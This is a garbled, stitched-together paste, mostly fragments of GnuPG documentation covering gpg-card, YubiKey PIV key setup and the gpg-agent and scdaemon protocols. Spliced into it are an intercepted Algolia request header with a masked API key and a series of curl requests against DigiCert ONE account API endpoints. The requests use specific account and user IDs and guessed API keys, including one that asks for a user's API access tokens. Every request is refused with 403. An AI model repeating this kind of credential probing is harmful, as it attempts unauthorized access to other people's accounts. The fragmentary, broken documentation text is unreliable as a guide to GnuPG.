Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key
—Shadowed

YUBIKEY cmd args ¶
Various commands pertaining to Yubikey tokens with cmd being:

LIST
List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
DISABLE
Enable or disable the specified or all applications on the given interface.

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708.

PIV

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: D2760001240102010006090746250000
Application type .: OpenPGP
Version ..........: 2.1
[...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp
gpg/card> yubikey list
Application  USB    NFC
-----------------------
OTP          yes    yes
U2F          yes    yes
OPGP         no     no
PIV          yes    no
OATH         yes    yes
FIDO2        yes    yes
gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: [none]
      keyref .....: PIV.9A
Card authenticat. : [none]
      keyref .....: PIV.9E
Digital signature : [none]
      keyref .....: PIV.9C
Key management ...: [none]
      keyref .....: PIV.9D
In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A
PIV card no. yk-9074625 detected
gpg/card> generate --algo=nistp256 PIV.9E
PIV card no. yk-9074625 detected
gpg/card> generate --algo=rsa2048 PIV.9C
PIV card no. yk-9074625 detected

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
Key management ...: [none]
      keyref .....: PIV.9D 
—force

$ gpgsm --gen-key -o encr.crt
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 1
What keysize do you want? (3072) 2048
Requested keysize is 2048 bits
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 3
Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N) y
These parameters are used:
    Key-Type: RSA
    Key-Length: 2048
    Key-Usage: encrypt
    Serial: random
    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N)
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpgsm: certificate created
Ready.
$ gpgsm --import encr.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpg/card> writecert PIV.9D < encr.crt

[...]
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn
$ gpgsm --gen-key -o sign.crt
Please select what kind of key you want:
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 3
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
Your selection? 3
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 2
Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N)
These parameters are used:
    Key-Type: card:PIV.9C
    Key-Length: 1024
    Key-Usage: sign
    Serial: random
    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N) y
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
gpgsm: certificate created
Ready.
$ gpgsm --import sign.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - [verified] -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <otto@example.net>

PIV authentication’ key with ssh:

$ ssh-add -l
384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn
$ gpg --full-gen-key
Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
  (14) Existing key from card
Your selection? 14
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
Your selection? 3
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name:
Email address: otto@example.net
Comment:
You selected this USER-ID:
    "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
gpg: key C3AFA9ED971BB365 marked as ultimately trusted
gpg: revocation certificate stored as '[...]D971BB365.rev'
public and secret key created and signed.

Note that this key cannot be used for encryption.  You may want to use
the command "--edit-key" to generate a subkey for this purpose.
pub   rsa2048 2019-04-04 [SC]
      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
uid                      otto@example.net
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
Secret key is available.

sec  rsa2048/C3AFA9ED971BB365
     created: 2019-04-04  expires: never       usage: SC
     card-no: FF020001008A77C1
     trust: ultimate      validity: ultimate
[ultimate] (1). otto@example.net
gpg> addkey
Secret parts of primary key are stored on-card.
Please select what kind of key you want:
   (3) DSA (sign only)
   (4) RSA (sign only)
   (5) Elgamal (encrypt only)
   (6) RSA (encrypt only)
  (14) Existing key from card
Your selection? 14
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
Your selection? 4
Please specify how long the key should be valid.
         0 = key does not expire
      <n>  = key expires in n days
      <n>w = key expires in n weeks
      <n>m = key expires in n months
      <n>y = key expires in n years
Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y
Really create? (y/N) y

sec  rsa2048/C3AFA9ED971BB365
     created: 2019-04-04  expires: never       usage: SC
     card-no: FF020001008A77C1
     trust: ultimate      validity: ultimate
ssb  rsa2048/7067860A98FCE6E1
     created: 2019-04-04  expires: never       usage: E
     card-no: FF020001008A77C1
[ultimate] (1). otto@example.net

gpg> save
Now you can use your PIV card also with gpg.


     # 000006
/* 32A19-D90712   
LEVEL-5 CLEARANCE ONLY
 ‘--force’
authentication key 
-header-'010203040506070801020304050607080102030405060708'
SETDATA hexstring
to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

  PKSIGN keyid
where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

  PKSIGN --hash=algoname keyid
READKEY hexified_certid
READCERT hexified_certid|keyid
SERIALNO
Return the serial number of the card using a status response like:

  S SERIALNO D27600000000000000000000
 WRITEKEY [--force] keyid
SETDATA hexstring
to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

  PKDECRYPT keyid
CHECKPIN idstr
RESTART
APDU [--atr] [--more] [--exlen[=n]] [hexstring]
S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va
CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
  A6935DD34EF3087973C706FC311AA2CCF733765B S

  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  
       # Key added on: 2011-07-20 20:38:46
       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/
gpg-connect-agent 'help COMMAND' /bye
SETKEY <keyGrip>
Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

  PKDECRYPT
The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

    S: INQUIRE CIPHERTEXT
    C: D (xxxxxx
    C: D xxxx)
    C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

     (enc-val
       (<algo>
         (<param_name1> <mpi>)
 	   ...
         (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

   C: PKDECRYPT
   S: INQUIRE CIPHERTEXT
   C: D (enc-val elg (a 349324324)
   C: D    (b 3F444677CA)))
   C: END
   S: # session key follows
   S: S PADDING 0
   S: D (value 1234567890ABCDEF0)
   S: OK decryption successful
The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
SIGKEY <keyGrip>
This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

   SETHASH --hash=<name>|<algo> <hexstring>
sig-val
       (<algo>
         (<param_name1> <mpi>)
 	   ...
         (<param_namen> <mpi>)))
The operation is affected by the option

   OPTION use-cache-for-signing=0|1
The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

   C: SIGKEY <keyGrip>
   S: OK key available
   C: SIGKEY <keyGrip>
   S: OK key available
   C: PKSIGN
   S: # I did ask the user whether he really wants to sign
   S: # I did ask the user for the passphrase
   S: INQUIRE HASHVAL
   C: D ABCDEF012345678901234
   C: END
   S: # signature follows
   S: D (sig-val rsa (s 45435453654612121212))
   S: OK
  GENKEY [--no-protection] [--preset] [<cache_nonce>]
Invokes the key generation process and the server will then inquire on the generation parameters, like:

   S: INQUIRE KEYPARM
   C: D (genkey (rsa (nbits  1024)))
   C: END
The format of the key parameters which depends on the algorithm is of the form:

    (genkey
      (algo
        (parameter_name_1 ....)
          ....
        (parameter_name_n ....)))
If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:

     (public-key
       (rsa
 	 (n <mpi>)
 	 (e <mpi>)))
Here is an example session:

   C: GENKEY
   S: INQUIRE KEYPARM
   C: D (genkey (rsa (nbits  1024)))
   C: END
   S: D (public-key
   S: D   (rsa (n 326487324683264) (e 10001)))
   S  OK key created
    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
LISTTRUSTED
GpgAgent returns a list of trusted keys line by line:

    S: D 000000001234454556565656677878AF2F1ECCFF P
    S: D 340387563485634856435645634856438576457A P
    S: D FEDC6532453745367FD83474357495743757435D S
    S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
Ok
Finally a client should be able to mark a key as trusted:

   MARKTRUSTED fingerprint "P"|"S"
The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

   S: INQUIRE TRUSTDESC
   C: D Do you trust the key with the fingerprint @FPR@
   C: D bla fasel blurb.
   C: END
   S: OK
GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
                 [--qualitybar] cache_id                \
                 [error_message prompt description]
PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]

HAVEKEY keygrips
  GET_CONFIRMATION description
  LEARN [--send]
UPDATESTARTUPTTY
SETDATA hexstring


  PKSIGN keyid


  PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid
READKEY hexified_certid
SETDATA hexstring
d

  PKSIGN keyid
 LEARN

  PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid
WRITEKEY [--force] keyid
PASSWD [--reset] [--nullpin] chvno
CHECKPIN idstr
APDU [--atr] [--more] [--exlen[=n]] [hexstring]
this:

     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import 

command --locate-external-key
command --locate-external-key
github/workflows/release.yml:
ldap://keys.(thedomain)
‘--auto-key-locate
 --auto-key-locate
--auto-key-retrieve


 honor-keyserver-url 

-sig-keyserver-url
--recv-key
honor-keyserver-url
--use-agent
--gpg-agent-info


--no-random-seed-file
Host: c7-use-3.algolianet. com
Accept: */*
Sec-Fetch-Site: cross-site
Accept-Language: en-US, en; q=0.9
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
Origin: https://dashboard.algolia.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
x-algolia-api-key: b3cf*************************米**
Content-Length: 27
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: empty

scdaemon.conf
1
HKCU\Software\GNU\GnuPG:DefaultLogFile,
--debug-level level
HKCU\Software\GNU\GnuPG:DefaultLogFile,
scd-event
HKCU\Software\GNU\GnuPG:HomeDir
HKCU\Software\GNU\GnuPG:DefaultLogFile,
reader_n.status
HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file
gpg-agent.conf
HKCU\Software\GNU\GnuPG:HomeDir
name: release
debug-pinentry 
--debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards
Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
gpg-connect-agent updatestartuptty /bye
Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye
--scdaemon-program filename
Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
--check-passphrase-pattern file
--check-sym-passphrase-pattern file
Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
Keys listed in the sshcontrol file
--disable-extended-key-format
These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support
--enable-win32-openssh-support
--enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye
gpg-connect-agent 'GETINFO s2k_time' /bye
To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye
--ssh-fingerprint-digest
Keys listed in the sshcontrol file

Active card
gpg-connect-agent /bye
bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty)
export GPG_TTY
--daemon [command line]
server

agent-program file ¶
Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file
Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file
Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid
Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card
AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
AUTH
FETCH
GENERATE [--force] [--algo=algo{+algo2}] keyref
KDF-SETUP ¶
Prepare the OpenPGP card KDF feature for this card.

LANG [--clear]
Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
NAME [--clear]
PRIVATEDO [--clear] n [< file] file
READCERT [--openpgp] certref > file ¶
Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3. 
$ Account id degi cert 90171939-7ae7-4884-85d4-9a5ccc670fa6
Account id organizations 
979310f6-db24-4c67-bcb9-6926d92cd6ec

User id 
fa5e727c-0527-44e0-9004-5fdc347b0b3f

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec
Server response
Code	Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:52:19 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 10 
 x-frame-options: same-origin 
 x-iinfo: 15-83073046-83073052 NNNN CT(36 39 0) RT(1710564738237 37) q(0 0 1 -1) r(2 2) U11 
 x-xss-protection: 1; mode=block 
Responses
Code	Description	Links
200	
Organization list

Media type

Controls Accept header.
Example Value
Schema
[
  {
    "id": "d9674d8f-7ad6-4280-89b5-136c2aded288",
    "name": "DigiCert Inc.",
    "address": "2801 N Thanksgiving Way",
    "address2": "Suite 500",
    "zip_code": 84043,
    "city": "Lehi",
    "state": "Utah",
    "country": "US",
    "phone": "+1 (123) 456-7890",
    "account": {
      "id": "ff94b6dc-d360-4245-9918-0d0cf7ac347a",
      "name": "Example Account"
    },
    "active": true
  }
]

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 1000'
Request URL
https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6

{
  "id": "ad65390a-0380-4522-bab6-f007c447757a",
  "name": "Example account 1",
  "active": true,
  "service_period": {
    "from": "2021-05-26",
    "to": "2022-05-26"
  },
  "friendly_identifier": "7092363",
  "admins": [
    {
      "id": "f7e866c9-768c-4442-adc9-abe2ba4b69d1",
      "name": "Jane Doe",
      "email": "jane.doe@example.com"
    }
  ],
  "sign_in_methods": [
    {
      "signInMethod": "standard",
      "status": "enabled",
      "mfaStatus": "disabled",
      "clientAuthCertLoginEnabled": false
    }
  ],
  "oauth_clients": [],
  "locale": "en_US"
}
No links

GET

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:40:43 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 6 
 x-frame-options: same-origin 
 x-iinfo: 12-53698010-53698015 NNNY CT(35 38 0) RT(1710564042696 63) q(0 0 0 -1) r(1 1) U11 
 x-xss-protection: 1; mode=block

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account?active=all&name=6309304695' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/account?active=all&name=6309304695
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:42:23 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 6 
 x-frame-options: same-origin 
 x-iinfo: 7-14411267-14411269 NNNY CT(36 40 0) RT(1710564142411 41) q(0 0 0 -1) r(1 1) U11 
 x-xss-protection: 1; mode=block 
Responses
Code Description Links
200 
List of accounts

Media type

Controls Accept header.
Examples

Example Value
Schema
[
  {
    "id": "50580ac7-60e4-4df2-a834-d12c1ab79afb",
    "name": "Example account 1",
    "active": true,
    "service_period": {
      "from": "2021-05-25",
      "to": "2022-05-25"
    },
    "friendly_identifier": "5258283",
    "admins": [
      {
        "id": "833e4906-fc45-4bd3-841e-40506c0e8ca8",
        "email": "api_service_user_1@example.com"
      },
      {
        "id": "fa8285c7-5e35-4ea8-8cc4-dc95f7dc3cd6",
        "email": "api_service_user_2@example.com"
      },
      {
        "id": "7d78b46a-c635-4bda-8b6d-13802046a963",
        "name": "John Doe",
        "email": "account_user_1@example.com"
      }
    ],
    "sign_in_methods": [
      {
        "signInMethod": "standard",
        "status": "enabled",
        "mfaStatus": "disabled",
        "clientAuthCertLoginEnabled": false
      }
    ],
    "locale": "en_US"
  },
  {
    "id": "be5ffbd2-1a50-4675-912f-2fe015812f87",
    "name": "Example account 2",
    "active": true,
    "service_period": {
      "from": "2021-05-26",
      "to": "2022-05-26"
    },
    "friendly_identifier": "7092363",
    "admins": [],
    "sign_in_methods": [
      {
        "signInMethod": "standard",
        "status": "enabled",
        "mfaStatus": "disabled",
        "clientAuthCertLoginEnabled": false
      }
    ],
    "locale": "en_US"
  }
]

Curl

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:44:01 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 5 
 x-frame-options: same-origin 
 x-iinfo: 15-83048556-83048560 NNNY CT(36 38 0) RT(1710564241016 44) q(0 0 0 -1) r(1 1) U11 
 x-xss-protection: 1; mode=block 
Responses
Code Description Links
200 
Success

Media type
